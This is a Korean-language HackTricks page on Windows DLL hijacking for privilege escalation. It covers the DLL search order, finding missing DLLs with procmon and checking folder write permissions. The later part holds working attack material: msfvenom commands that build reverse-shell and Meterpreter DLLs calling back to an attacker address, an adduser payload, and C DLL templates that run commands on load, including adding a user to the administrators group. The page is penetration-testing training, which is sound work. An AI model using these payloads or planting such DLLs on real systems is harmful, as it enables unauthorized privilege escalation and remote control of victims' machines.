# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}

<figure><img src="../../../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 **가입하세요**, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**입니다! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 기본 정보

DLL 하이재킹은 신뢰할 수 있는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것입니다. 이 용어는 **DLL 스푸핑, 주입 및 사이드 로딩**과 같은 여러 전술을 포함합니다. 주로 코드 실행, 지속성 달성 및 덜 일반적으로 권한 상승을 위해 사용됩니다. 여기서 상승에 초점을 맞추고 있지만, 하이재킹 방법은 목표에 관계없이 일관됩니다.

### 일반적인 기술

DLL 하이재킹을 위해 여러 방법이 사용되며, 각 방법은 애플리케이션의 DLL 로딩 전략에 따라 효과가 다릅니다:

1. **DLL 교체**: 진짜 DLL을 악성 DLL로 교체하며, 원래 DLL의 기능을 유지하기 위해 DLL 프록시를 사용할 수 있습니다.
2. **DLL 검색 순서 하이재킹**: 악성 DLL을 합법적인 DLL보다 앞서 검색 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **팬텀 DLL 하이재킹**: 애플리케이션이 로드할 악성 DLL을 생성하여 존재하지 않는 필수 DLL로 인식하게 합니다.
4. **DLL 리디렉션**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 합니다.
5. **WinSxS DLL 교체**: WinSxS 디렉토리에서 합법적인 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL 사이드 로딩과 관련이 있습니다.
6. **상대 경로 DLL 하이재킹**: 복사된 애플리케이션과 함께 사용자 제어 디렉토리에 악성 DLL을 배치하여 이진 프록시 실행 기술과 유사하게 만듭니다.

## 누락된 DLL 찾기

시스템 내에서 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals에서 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 **다음 2개의 필터를 설정**하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **파일 시스템 활동**만 표시합니다:

![](<../../../images/image (153).png>)

**일반적으로 누락된 dll을 찾고 있다면** 몇 **초** 동안 이 상태로 두세요.\
**특정 실행 파일 내에서 누락된 dll을 찾고 있다면** "프로세스 이름" "포함" "\<exec name>"과 같은 **다른 필터를 설정하고 실행한 후 이벤트 캡처를 중지해야 합니다**.

## 누락된 DLL 악용하기

권한을 상승시키기 위해, 우리가 가질 수 있는 최선의 기회는 **특권 프로세스가 로드하려고 시도할 DLL을 작성할 수 있는 것**입니다. 따라서 우리는 **원래 DLL**이 있는 폴더보다 **먼저 검색되는 폴더**에 DLL을 **작성**할 수 있거나, DLL이 검색될 **어떤 폴더에 작성할 수 있는 것**입니다. 원래 **DLL이 어떤 폴더에도 존재하지 않는 경우**.

### DLL 검색 순서

**Microsoft 문서** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.**

**Windows 애플리케이션**은 특정 순서를 따르는 **미리 정의된 검색 경로**를 따라 DLL을 찾습니다. DLL 하이재킹 문제는 해로운 DLL이 이러한 디렉토리 중 하나에 전략적으로 배치되어 진짜 DLL보다 먼저 로드되도록 할 때 발생합니다. 이를 방지하기 위한 해결책은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

32비트 시스템에서 **DLL 검색 순서**는 다음과 같습니다:

1. 애플리케이션이 로드된 디렉토리.
2. 시스템 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요.(_C:\Windows\System32_)
3. 16비트 시스템 디렉토리. 이 디렉토리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요. (_C:\Windows_)
5. 현재 디렉토리.
6. PATH 환경 변수에 나열된 디렉토리. 여기에는 **App Paths** 레지스트리 키에 의해 지정된 애플리케이션별 경로가 포함되지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이것이 **SafeDllSearchMode**가 활성화된 상태에서의 **기본** 검색 순서입니다. 비활성화되면 현재 디렉토리가 두 번째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화됨).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.

마지막으로, **DLL은 이름 대신 절대 경로를 지정하여 로드될 수 있습니다**. 이 경우 해당 DLL은 **그 경로에서만 검색됩니다**(DLL에 종속성이 있는 경우, 종속성은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법이 있지만 여기서는 설명하지 않겠습니다.

#### Windows 문서의 DLL 검색 순서 예외

표준 DLL 검색 순서에 대한 특정 예외는 Windows 문서에 명시되어 있습니다:

- **메모리에 이미 로드된 DLL과 이름이 같은 DLL**이 발견되면 시스템은 일반 검색을 우회합니다. 대신 리디렉션 및 매니페스트를 확인한 후 메모리에 이미 있는 DLL로 기본 설정합니다. **이 시나리오에서는 시스템이 DLL 검색을 수행하지 않습니다**.
- DLL이 현재 Windows 버전의 **알려진 DLL**로 인식되는 경우, 시스템은 검색 프로세스를 생략하고 알려진 DLL의 버전과 해당 종속 DLL을 사용합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**는 이러한 알려진 DLL의 목록을 보유합니다.
- **DLL에 종속성이 있는 경우**, 이러한 종속 DLL의 검색은 초기 DLL이 전체 경로를 통해 식별되었는지 여부에 관계없이 **모듈 이름**만으로 표시된 것처럼 수행됩니다.

### 권한 상승

**요구 사항**:

- **다른 권한**(수평 또는 측면 이동)으로 작동하거나 작동할 프로세스를 식별하고, **DLL이 누락된** 상태여야 합니다.
- **DLL이 검색될** **디렉토리**에 대한 **쓰기 권한**이 있어야 합니다. 이 위치는 실행 파일의 디렉토리일 수도 있고 시스템 경로 내의 디렉토리일 수도 있습니다.

네, 기본적으로 **특권 실행 파일이 DLL이 누락된 상태를 찾는 것은 다소 이상하기 때문에** 요구 사항을 찾는 것이 복잡합니다. 그리고 **시스템 경로 폴더에 쓰기 권한을 갖는 것은 기본적으로 불가능합니다**. 그러나 잘못 구성된 환경에서는 가능합니다.\
운이 좋다면 요구 사항을 충족하는 경우 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인할 수 있습니다. **프로젝트의 주요 목표가 UAC 우회이지만**, 사용할 수 있는 Windows 버전의 DLL 하이재킹 **PoC**를 찾을 수 있습니다(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 됩니다).

폴더에서 **권한을 확인할 수 있습니다**:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
모든 폴더의 권한을 확인하십시오 PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
실행 파일의 임포트와 DLL의 익스포트를 확인할 수도 있습니다:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
전체 가이드는 **System Path 폴더에 쓰기 권한을 이용한 Dll Hijacking 악용 방법**을 확인하세요:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 시스템 PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하기 위한 다른 흥미로운 자동화 도구는 **PowerSploit 함수**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_입니다.

### 예시

악용 가능한 시나리오를 발견한 경우, 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 가져올 모든 함수를 내보내는 dll을 생성하는 것**입니다. 어쨌든, Dll Hijacking은 [**Medium Integrity 레벨에서 High로 상승하는 데 유용합니다 (UAC 우회)**](../../authentication-credentials-uac-and-efs/#uac) 또는 [**High Integrity에서 SYSTEM으로 상승하는 데 유용합니다**](../#from-high-integrity-to-system)**.** 유효한 dll을 생성하는 방법에 대한 예시는 이 dll hijacking 연구에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **템플릿**으로 유용할 수 있는 **기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll 프록시화**

기본적으로 **Dll 프록시**는 **로드될 때 악성 코드를 실행할 수 있는 Dll**이지만, **실제 라이브러리에 대한 모든 호출을 중계하여** **노출**하고 **작동**하는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 **실행 파일을 지정하고 프록시화할 라이브러리를 선택하여** **프록시화된 dll을 생성**하거나 **Dll을 지정하고 프록시화된 dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell 가져오기 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**미터프리터 얻기 (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 버전만 확인됨, x64 버전은 없음):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 당신의 것

여러 경우에 컴파일한 Dll은 **희생 프로세스에 의해 로드될 여러 함수를 내보내야** 한다는 점에 유의하세요. 이러한 함수가 존재하지 않으면 **바이너리가** 이를 **로드할 수 없으며** **익스플로잇이 실패하게 됩니다**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## References

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **가입하세요** **Intigriti**에, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../../banners/hacktricks-training.md}}
